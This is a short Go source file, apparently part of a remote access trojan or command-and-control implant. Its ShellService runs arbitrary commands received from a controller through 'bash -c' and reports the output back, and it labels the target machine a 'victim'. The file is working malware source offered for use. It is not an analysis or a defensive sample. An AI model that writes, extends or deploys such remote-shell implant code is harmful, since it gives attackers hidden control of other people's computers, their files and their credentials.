package services

import (
	"main/utils"
	"os"
	"os/exec"
	"strings"
)

type ShellService struct {
}

func (s *ShellService) Run(body []string, victim string) {
	if body[0] == "cd" {
		os.Chdir(body[1])
		return
	}
	out, err := exec.Command("bash", "-c", strings.Join(body, " ")).Output()
	if err != nil {
		utils.HandleShellRequest(err.Error(), victim)
		return
	}
	_, err = utils.HandleShellRequest(string(out), victim)
	if err != nil {
		utils.HandleError(err.Error(), victim)
	}
}
